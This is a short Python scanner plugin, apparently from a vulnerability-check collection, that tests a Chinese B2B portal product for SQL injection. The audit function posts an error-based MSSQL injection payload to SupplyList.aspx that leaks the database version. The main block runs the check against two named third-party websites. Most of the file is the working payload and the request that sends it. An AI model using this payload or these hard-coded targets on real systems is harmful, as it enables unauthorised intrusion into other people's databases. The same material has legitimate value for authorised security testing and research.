#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:铭万B2B门户建站公司存在通用漏洞 影响大量企业用户
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0104430

def assign(service,arg):
    if service=="mainone_b2b":
        return True,arg 
    


def  audit(arg):
    url=arg+"Supply/SupplyList.aspx?ChangeType=0"
    post="strKeyWord=%27%20and%201=char(74)%2Bchar(73)%2B@@version%20and%20%27%%27=%27"
    
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==500 and "JIMicrosoft" in res:
        security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('mainone_b2b','http://www.56b2b.cn/')[1])
    audit(assign('mainone_b2b','http://www.fw5151.com/')[1])